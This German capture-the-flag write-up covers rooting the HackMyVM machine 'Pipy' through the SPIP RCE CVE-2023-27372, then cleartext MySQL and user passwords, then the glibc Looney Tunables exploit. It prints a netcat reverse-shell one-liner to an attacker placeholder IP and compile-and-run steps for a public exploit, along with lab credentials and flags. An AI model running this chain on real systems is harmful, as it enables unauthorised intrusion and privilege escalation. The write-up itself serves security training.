# Pipy - HackMyVM (Easy)

![Pipy.png](Pipy.png)

## Übersicht

*   **VM:** Pipy
*   **Plattform:** HackMyVM (https://hackmyvm.eu/machines/machine.php?vm=Pipy)
*   **Schwierigkeit:** Easy
*   **Autor der VM:** DarkSpirit
*   **Datum des Writeups:** 2023-10-26
*   **Original-Writeup:** https://alientec1908.github.io/Pipy_HackMyVM_Easy/
*   **Autor:** Ben C.

## Kurzbeschreibung

Das Ziel dieser Challenge war es, Root-Rechte auf der Maschine "Pipy" zu erlangen. Der Weg dorthin begann mit der Entdeckung einer SPIP 4.2.0 CMS-Installation auf dem Webserver. Eine bekannte Remote Code Execution (RCE)-Schwachstelle in dieser SPIP-Version (CVE-2023-27372) wurde mittels eines Python-Exploits ausgenutzt, um eine Reverse Shell als `www-data` zu erhalten. Nach dem Zugriff wurde in einer SPIP-Konfigurationsdatei (`/config/connect.php`) das MySQL-Root-Passwort (`dbpassword`) gefunden. In der MySQL-Datenbank (`spip.spip_auteurs`) wurde das Klartextpasswort (`4ng3l4`) für den Benutzer `angela` entdeckt. Die finale Rechteausweitung zu Root gelang durch Ausnutzung der "Looney Tunables"-Schwachstelle (CVE-2023-4911) in der installierten GLIBC-Version (2.35), für die ein öffentlicher Exploit kompiliert und ausgeführt wurde.

## Disclaimer / Wichtiger Hinweis

Die in diesem Writeup beschriebenen Techniken und Werkzeuge dienen ausschließlich zu Bildungszwecken im Rahmen von legalen Capture-The-Flag (CTF)-Wettbewerben und Penetrationstests auf Systemen, für die eine ausdrückliche Genehmigung vorliegt. Die Anwendung dieser Methoden auf Systeme ohne Erlaubnis ist illegal. Der Autor übernimmt keine Verantwortung für missbräuchliche Verwendung der hier geteilten Informationen. Handeln Sie stets ethisch und verantwortungsbewusst.

## Verwendete Tools

*   `arp-scan`
*   `vi` / `nano`
*   `nikto`
*   `nmap`
*   `gobuster`
*   `dirb`
*   `msfvenom`
*   `nc` (Netcat)
*   `wget`
*   `python3 http.server`
*   Python3 (Exploit-Skripts, Shell-Stabilisierung)
*   `git`
*   `gcc` / `make` (für Kernel-Exploit)
*   `mysql`
*   Standard Linux-Befehle (`cat`, `ls`, `id`, `uname`, `getcap`, `find`, `su`, `sudo` (versucht), `cd`, `echo`, `ldd`, `mkdir`, `rm`, `mkfifo`)
*   Custom Exploit: `rce_spip.py` (für CVE-2023-27372)
*   Custom Exploit: für CVE-2023-4911 (Looney Tunables)

## Lösungsweg (Zusammenfassung)

Der Angriff auf die Maschine "Pipy" gliederte sich in folgende Phasen:

1.  **Reconnaissance & Web Enumeration:**
    *   IP-Adresse des Ziels (192.168.2.106) mit `arp-scan` identifiziert. Hostname `pipy.hmv` in `/etc/hosts` eingetragen.
    *   `nmap`-Scan offenbarte Port 22 (SSH, OpenSSH 8.9p1) und Port 80 (HTTP, Apache 2.4.52).
    *   `nikto` und `nmap`-Skripte identifizierten das CMS SPIP 4.2.0.
    *   `gobuster` und `dirb` fanden SPIP-Verzeichnisse (`/ecrire`, `/config`, `/tmp`, etc.) und `htaccess.txt`. LFI-Versuche auf `spip.php?page=` scheiterten.

2.  **Initial Access (RCE via SPIP Exploit als `www-data`):**
    *   Recherche nach Exploits für SPIP 4.2.0 führte zu CVE-2023-27372 (RCE). Ein Python-Exploit (`rce_spip.py`, basierend auf EDB-ID 51536) wurde verwendet.
    *   Eine Netcat-Reverse-Shell-Payload (generiert mit `msfvenom` oder manuell) wurde direkt mit dem SPIP-Exploit auf dem Ziel ausgeführt: `python3 rce_spip.py -u http://pipy.hmv -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ANGRIFFS_IP 4443 >/tmp/f'`.
    *   Eine Reverse Shell als `www-data` wurde auf einem Netcat-Listener (Port 4443) empfangen und stabilisiert.

3.  **Privilege Escalation (von `www-data` zu `angela` via MySQL Credentials):**
    *   Als `www-data` wurde die Datei `/var/www/html/config/connect.php` gefunden.
    *   Diese Datei enthielt MySQL-Zugangsdaten: `root`:`dbpassword` für die Datenbank `spip`.
    *   Login in die lokale MariaDB-Datenbank mit diesen Credentials.
    *   In der Tabelle `spip.spip_auteurs` wurde der Benutzer `angela` mit dem Klartextpasswort `4ng3l4` gefunden.
    *   Mit `su angela` und dem Passwort `4ng3l4` wurde erfolgreich zum Benutzer `angela` gewechselt.
    *   Die User-Flag (`dab37650d43787424362d5805140538d`) wurde in `/home/angela/user.txt` gefunden.

4.  **Privilege Escalation (von `angela` zu `root` via Looney Tunables / CVE-2023-4911):**
    *   Als `angela` wurde die GLIBC-Version (`ldd --version`) zu 2.35 identifiziert, die anfällig für die "Looney Tunables"-Schwachstelle (CVE-2023-4911) ist. `sudo -l` zeigte keine direkten Rechte.
    *   Ein öffentlicher Exploit für CVE-2023-4911 wurde von GitHub (`https://github.com/leesh3288/CVE-2023-4911.git`) nach `/dev/shm/hacker/CVE-2023-4911/` auf dem Zielsystem geklont.
    *   Der Exploit (`exp.c`) wurde mit `gcc exp.c -o hack` kompiliert.
    *   Durch Ausführen von `./hack` wurde die GLIBC-Schwachstelle ausgenutzt und eine Root-Shell erlangt (`uid=0(root)`).
    *   Die Root-Flag (`ab55ed08716cd894e8097a87dafed016`) wurde in `/root/root.txt` gefunden.

## Wichtige Schwachstellen und Konzepte

*   **Bekannte CMS-Schwachstelle (SPIP RCE / CVE-2023-27372):** Eine veraltete Version des SPIP CMS war anfällig für Remote Code Execution.
*   **Klartext-Datenbank-Credentials in Konfigurationsdatei:** Das MySQL-Root-Passwort war in `connect.php` gespeichert.
*   **Klartextpasswörter in Datenbank:** Das Passwort für den Benutzer `angela` war unverschlüsselt in der `spip_auteurs`-Tabelle gespeichert.
*   **Kernel/Bibliotheks-Schwachstelle (Looney Tunables / CVE-2023-4911):** Eine anfällige Version der GLIBC ermöglichte lokale Privilegieneskalation zu Root.
*   **Information Disclosure:** Nikto und Nmap enthüllten verwendete Softwareversionen und Konfigurationsdetails.

## Flags

*   **User Flag (`/home/angela/user.txt`):** `dab37650d43787424362d5805140538d`
*   **Root Flag (`/root/root.txt`):** `ab55ed08716cd894e8097a87dafed016`

## Tags

`HackMyVM`, `Pipy`, `Easy`, `SPIP RCE`, `CVE-2023-27372`, `Database Leak`, `MySQL`, `Looney Tunables`, `CVE-2023-4911`, `GLIBC Exploit`, `Linux`, `Web`, `Privilege Escalation`, `Apache`
